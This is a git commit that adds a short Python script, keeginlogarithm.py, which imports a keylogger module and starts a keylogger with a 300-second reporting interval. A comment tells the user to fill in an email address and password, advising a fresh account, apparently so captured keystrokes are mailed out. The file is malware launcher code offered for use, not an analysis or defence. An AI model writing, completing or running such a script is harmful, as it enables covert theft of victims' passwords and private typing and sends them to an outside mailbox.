8656b22921b410b230bfc93e726b91de4e0cfb79
Alex Rodriguez <55252902+Alex-Guido@users.noreply.github.com>
2022-01-06 08:30:05 +0000

    Create keeginlogarithm.py

---
+++ keeginlogarithm.py
@@ -0,0 +1,7 @@
+#!/usr/bin/env python
+import keylogger
+
+# Make sure to edit your login here
+
+keeginlogarithm = keylogger.Keylogger(300, "", "") # in the blank spaces enter your email,password | Use a new email
+keeginlogarithm.start()
